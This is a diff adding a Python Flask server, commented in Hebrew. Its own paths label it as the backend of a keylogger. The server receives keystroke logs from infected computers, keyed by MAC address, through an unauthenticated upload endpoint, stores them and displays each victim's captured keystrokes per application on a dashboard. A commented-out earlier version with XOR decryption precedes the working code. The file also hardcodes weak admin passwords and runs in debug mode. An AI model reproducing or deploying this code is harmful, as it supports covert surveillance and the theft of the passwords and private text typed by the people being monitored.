@@ -1,0 +1,472 @@
+# import flask
+# from flask import Flask
+# import os
+# import json
+# import time
+# from flask_cors import CORS
+# import dc_Encryptor
+#
+# app = Flask(__name__)
+# CORS(app)
+# data_file = r"C:\Users\1\Desktop\keylogger\server_data\computers"
+#
+# from flask import request, redirect, url_for
+# from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
+#
+# app.secret_key = "סוד_מאובטח"  # מפתח להצפנה
+#
+# login_manager = LoginManager()
+# login_manager.init_app(app)
+# login_manager.login_view = "login"
+#
+# # רשימת משתמשים וסיסמאות (כדאי לשמור בעתיד במסד נתונים)
+# users = {"admin": "password123", "user": "1234"}
+#
+# # מחלקת משתמשים
+# class User(UserMixin):
+#     def __init__(self, username):
+#         self.id = username
+#
+# # פונקציה שמטענת משתמש לפי ה-ID
+# @login_manager.user_loader
+# def load_user(user_id):
+#     return User(user_id) if user_id in users else None
+#
+# # עמוד התחברות
+# @app.route('/login', methods=['GET', 'POST'])
+# def login():
+#     if request.method == 'POST':
+#         username = request.form.get('username')
+#         password = request.form.get('password')
+#         print(password)
+#         if username in users and users[username] == password:
+#             user = User(username)
+#             login_user(user)
+#             return redirect(url_for('dashboard'))
+#
+#     return render_template('index.html')
+#
+# # עמוד מוגן (דשבורד)
+# @app.route('/dashboard')
+# @login_required
+# def dashboard():
+#     return render_template('style_navbar.html', username=current_user.id)
+#
+#
+# @app.route('/folders', methods=['GET'])
+# @login_required
+# def get_folders():
+#     base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
+#     try:
+#         folders = [f for f in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, f))]
+#     except Exception as e:
+#         folders = []
+#
+#     return render_template('list_of_folders.html', folders=folders)
+#
+#
+# from flask import render_template
+#
+# @app.route('/folders/<folder_name>', methods=['GET'])
+# @login_required
+# def show_folder_contents(folder_name):
+#     # מחפש את הנתונים עבור תיקיית ה-MAC
+#     base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
+#     files = load_data(mac_address=str(folder_name))
+#
+#     # יצירת רשימה של התאריכים והקבצים הזמינים
+#     available_dates = []
+#     for mac, data in files.items():
+#         for date in data.keys():
+#             available_dates.append(date)
+#
+#     # מחזיר את המידע לתבנית ה-HTML
+#     return render_template('folder_contents.html', folder_name=folder_name, available_dates=available_dates)
+#
+#
+# @app.route('/folders/<folder_name>/<date>', methods=['GET'])
+# @login_required
+# def show_file_data(folder_name, date):
+#     # טוען את הנתונים עבור תאריך מסוים
+#     files = load_data(mac_address=str(folder_name), date=date)
+#
+#     # הצגת המידע של הקובץ
+#     file_info = []
+#     for mac, data in files.items():
+#         if date in data:
+#             print(f"Found data for {date}.json")  # הדפסת מידע שהנתונים מצורפים לתאריך
+#             for filename, key_events in data[date].items():
+#                 for time_write, current_app_event in key_events.items():
+#                     for current_app, events in current_app_event.items():
+#                         file_info.append({
+#                             'mac': mac,
+#                             'filename': filename,
+#                             'date': time_write,  # כאן ניתן להחזיר את התאריך בצורה מדויקת
+#                             'app': current_app,
+#                             'data': events
+#                         })
+#
+#     return render_template('file_data.html', folder_name=folder_name, date=date, file_info=file_info)
+#
+# # עמוד התנתקות
+# @app.route('/logout')
+# @login_required
+# def logout():
+#     logout_user()
+#     return redirect(url_for('login'))
+#
+#
+# def load_data(mac_address=None, date=None, root_directory=data_file):
+#         all_data = {}
+#         # בדיקה שהתיקייה הראשית קיימת
+#         if not os.path.exists(root_directory):
+#             return all_data
+#
+#         for mac in os.listdir(root_directory):
+#             mac_path = os.path.join(root_directory, mac)
+#             if not os.path.isdir(mac_path):
+#                 continue
+#
+#             if mac_address is not None and mac != mac_address:
+#                 continue
+#
+#             mac_data = {}  # מילון לאחסון הנתונים עבור MAC זה
+#
+#             # מעבר על כל הקבצים בתיקיית ה-MAC (מחפשים קבצי JSON)
+#             for filename in os.listdir(mac_path):
+#                 if not filename.endswith(".json"):
+#                     continue
+#                 # הסרת הסיומת כדי לקבל את התאריך
+#                 file_date = os.path.splitext(filename)[0]
+#
+#                 # אם סופק date והשם (התאריך) לא תואם, דלג
+#                 if date is not None and not file_date.startswith(date):
+#                     continue
+#
+#                 file_path = os.path.join(mac_path, filename)
+#                 try:
+#                     with open(file_path, "r", encoding="utf-8") as f:
+#                         data = json.load(f)
+#                     mac_data[file_date] = data
+#                 except json.JSONDecodeError:
+#                     continue
+#
+#             if mac_data:
+#                 all_data[mac] = mac_data
+#
+#         return all_data
+#
+#
+#
+#
+#
+# x = {'d0:39:57:0d:5c:a5': {'20/02/2025  11:58': {'app.py – app.py': ['backspace', 'a']}}}
+#
+# y = {'d0:39:57:0d:5c:a5': {'20/02/2025  11:58': {'app.py – app.py': ['1', '2', '3', '4', '5', '6', '7', '8', '9']}}}
+# def merge_dicts(dict_a, dict_b):
+#     """
+#     ממזג שני מילונים לפי הכללים:
+#     1. מפתחות משותפים ממוזגים בהתאם לסוג הערכים.
+#     2. מפתחות ייחודיים נשמרים כמות שהם.
+#     """
+#     print(dict_a)
+#     print("aaa")
+#     print(dict_b)
+#     print("bbb")
+#
+#     merged = {}
+#     # נעבור על מפתחות dict_a
+#     for key, val_a in dict_a.items():
+#         if key in dict_b:
+#             # יש מפתח זהה גם ב-dict_b
+#             val_b = dict_b[key]
+#             merged[key] = merge_values(val_a, val_b)
+#         else:
+#             # המפתח קיים רק ב-dict_a
+#             merged[key] = val_a
+#
+#     # נוסיף מפתחות שקיימים רק ב-dict_b
+#     for key, val_b in dict_b.items():
+#         if key not in dict_a:
+#             merged[key] = val_b
+#     print(merged)
+#     return merged
+#
+# def merge_values(val_a, val_b):
+#     """
+#     ממזג שני ערכים בהתאם לסוגם:
+#     - אם שניהם dict => מיזוג רקורסיבי.
+#     - אם שניהם list => שרשור הרשימות.
+#     - אם אחד list והשני לא => הפיכה ל-list ושרשור.
+#     - אם שניהם לא list => הפיכתם לרשימה [val_a, val_b].
+#     """
+#     if isinstance(val_a, dict) and isinstance(val_b, dict):
+#         return merge_dicts(val_a, val_b)
+#
+#     elif isinstance(val_a, list) and isinstance(val_b, list):
+#         return val_a + val_b
+#
+#     elif isinstance(val_a, list) and not isinstance(val_b, list):
+#         return val_a + [val_b]
+#
+#     elif not isinstance(val_a, list) and isinstance(val_b, list):
+#         return [val_a] + val_b
+#     else:
+#         return [val_a, val_b]
+#
+# def save_new_data(data):
+#     print(type(data))
+#     first_key = (next(iter(data)))
+#     mac_address = first_key.replace(":" , "-")
+#     # גישה למפתח השני במילון הפנימי
+#     second_key = next(iter(data[first_key]))
+#     date = time.strftime('%d-%m-%Y_%H-%M')
+#     path = data_file + rf'\{mac_address}'
+#     # new_data = merge_dicts(old_data,data)
+#     # print(new_data)
+#     if not os.path.exists(path):
+#         os.makedirs(path)
+#     with open(path+rf"\{date}.json" , "w" , encoding='utf-8') as file:
+#         json.dump(data , file , indent=4 , ensure_ascii=False)
+#
+#
+# @app.route('/add_data', methods=['POST'])
+# def upload_data():
+#     # try:
+#         # קבלת נתונים כ-JSON
+#         new_data = flask.request.json
+#         print(new_data)
+#         # אם אין נתונים, מחזירים שגיאה
+#         if not new_data:
+#             return flask.jsonify({'error': "No data received"}), 400
+#
+#         # הצפנה אם צריך
+#         decrypted_data = inon_dc_Encryptor.Encryptor.xor_decryption(new_data, "aaa")
+#
+#         # שמירת הנתונים
+#         save_new_data(decrypted_data)
+#
+#         # מחזירים הודעת הצלחה
+#         return flask.jsonify({'message': 'Save successfully'}), 200
+#
+#     # except Exception as e:
+#     #     # במקרה של שגיאה כלשהי, מחזירים הודעת שגיאה
+#     #     return flask.jsonify({'error': str(e)}), 400
+#
+#
+# @app.route('/<computers>',methods=['GET'])
+# @login_required
+# def get_data(computers,mac_address=None,date=None):
+#         if not computers:
+#             return flask.jsonify({'error': 'must get -computers-'}), 400
+#
+#         data = load_data(mac_address=mac_address, date=date)
+#
+#         return flask.jsonify(data), 200
+#
+#
+#
+#
+# @app.route('/health',methods=['GET'])
+# def health():
+#     return flask.jsonify({'status':'server active'}),200
+#
+# if __name__ == '__main__':
+#     app.run(debug=True)
+# # print(load_data("d0-39-57-0d-5c-a5" , date='24-02-2025_10-10'))
+
+import flask
+from flask import Flask, request, redirect, url_for, render_template, jsonify
+import os
+import json
+import time
+from flask_cors import CORS
+from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
+
+app = Flask(__name__)
+CORS(app)
+app.secret_key = "סוד_מאובטח"  # מפתח להצפנה
+data_file = r"C:\Users\1\Desktop\keylogger\server_data\computers"
+
+# הגדרת Flask-Login
+login_manager = LoginManager()
+login_manager.init_app(app)
+login_manager.login_view = "login"
+
+# רשימת משתמשים וסיסמאות (במקום מסד נתונים לעת עתה)
+users = {"admin": "password123", "user": "1234"}
+
+# מחלקת משתמשים
+class User(UserMixin):
+    def __init__(self, username):
+        self.id = username
+
+@login_manager.user_loader
+def load_user(user_id):
+    return User(user_id) if user_id in users else None
+
+# דף ראשי
+@app.route('/')
+def home():
+    return redirect(url_for('login'))
+
+# עמוד התחברות
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        if username in users and users[username] == password:
+            user = User(username)
+            login_user(user)
+            return redirect(url_for('dashboard'))
+        else:
+            return render_template('index.html', error="שם משתמש או סיסמה שגויים")
+    return render_template('index.html')
+
+# עמוד מוגן (דשבורד)
+@app.route('/dashboard')
+@login_required
+def dashboard():
+    return render_template('style_navbar.html', username=current_user.id)
+
+# הצגת תיקיות
+@app.route('/folders', methods=['GET'])
+@login_required
+def get_folders():
+    base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
+    try:
+        folders = [f for f in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, f))]
+    except Exception as e:
+        folders = []
+    return render_template('list_of_folders.html', folders=folders)
+
+# תוכן תיקייה
+@app.route('/folders/<folder_name>', methods=['GET'])
+@login_required
+def show_folder_contents(folder_name):
+    files = load_data(mac_address=folder_name)
+    available_dates = []
+    for mac, data in files.items():
+        for date in data.keys():
+            available_dates.append(date)
+    return render_template('folder_contents.html', folder_name=folder_name, available_dates=available_dates)
+
+# הצגת נתונים לפי תאריך
+@app.route('/folders/<folder_name>/<date>', methods=['GET'])
+@login_required
+def show_file_data(folder_name, date):
+    files = load_data(mac_address=folder_name, date=date)
+    file_info = []
+    for mac, data in files.items():
+        if date in data:
+            for filename, key_events in data[date].items():
+                for time_write, current_app_event in key_events.items():
+                    for current_app, events in current_app_event.items():
+                        file_info.append({
+                            'mac': mac,
+                            'filename': filename,
+                            'date': time_write,
+                            'app': current_app,
+                            'data': events
+                        })
+    return render_template('file_data.html', folder_name=folder_name, date=date, file_info=file_info)
+
+# התנתקות
+@app.route('/logout')
+@login_required
+def logout():
+    logout_user()
+    return redirect(url_for('login'))
+
+# פונקציה לטעינת נתונים
+def load_data(mac_address=None, date=None, root_directory=data_file):
+    all_data = {}
+    if not os.path.exists(root_directory):
+        return all_data
+
+    for mac in os.listdir(root_directory):
+        mac_path = os.path.join(root_directory, mac)
+        if not os.path.isdir(mac_path) or (mac_address and mac != mac_address):
+            continue
+
+        mac_data = {}
+        for filename in os.listdir(mac_path):
+            if not filename.endswith(".json"):
+                continue
+            file_date = os.path.splitext(filename)[0]
+            if date and not file_date.startswith(date):
+                continue
+
+            file_path = os.path.join(mac_path, filename)
+            try:
+                with open(file_path, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                mac_data[file_date] = data
+            except json.JSONDecodeError:
+                continue
+
+        if mac_data:
+            all_data[mac] = mac_data
+    return all_data
+
+# מיזוג מילונים
+def merge_dicts(dict_a, dict_b):
+    merged = {}
+    for key, val_a in dict_a.items():
+        if key in dict_b:
+            val_b = dict_b[key]
+            merged[key] = merge_values(val_a, val_b)
+        else:
+            merged[key] = val_a
+    for key, val_b in dict_b.items():
+        if key not in dict_a:
+            merged[key] = val_b
+    return merged
+
+def merge_values(val_a, val_b):
+    if isinstance(val_a, dict) and isinstance(val_b, dict):
+        return merge_dicts(val_a, val_b)
+    elif isinstance(val_a, list) and isinstance(val_b, list):
+        return val_a + val_b
+    elif isinstance(val_a, list):
+        return val_a + [val_b]
+    elif isinstance(val_b, list):
+        return [val_a] + val_b
+    else:
+        return [val_a, val_b]
+
+# שמירת נתונים
+def save_new_data(data):
+    first_key = next(iter(data))
+    mac_address = first_key.replace(":", "-")
+    date = time.strftime('%d-%m-%Y_%H-%M')
+    path = os.path.join(data_file, mac_address)
+    if not os.path.exists(path):
+        os.makedirs(path)
+    with open(os.path.join(path, f"{date}.json"), "w", encoding='utf-8') as file:
+        json.dump(data, file, indent=4, ensure_ascii=False)
+
+# העלאת נתונים
+@app.route('/add_data', methods=['POST'])
+def upload_data():
+    new_data = request.json
+    if not new_data:
+        return jsonify({'error': "No data received"}), 400
+    save_new_data(new_data)  # הצפנה הוסרה כי dc_Encryptor לא זמין
+    return jsonify({'message': 'Save successfully'}), 200
+
+# קבלת נתונים לפי MAC
+@app.route('/computers/<mac_address>', methods=['GET'])
+@login_required
+def get_data(mac_address):
+    data = load_data(mac_address=mac_address)
+    return jsonify(data), 200
+
+# בדיקת מצב השרת
+@app.route('/health', methods=['GET'])
+def health():
+    return jsonify({'status': 'server active'}), 200
+
+if __name__ == '__main__':
+    app.run(debug=True)
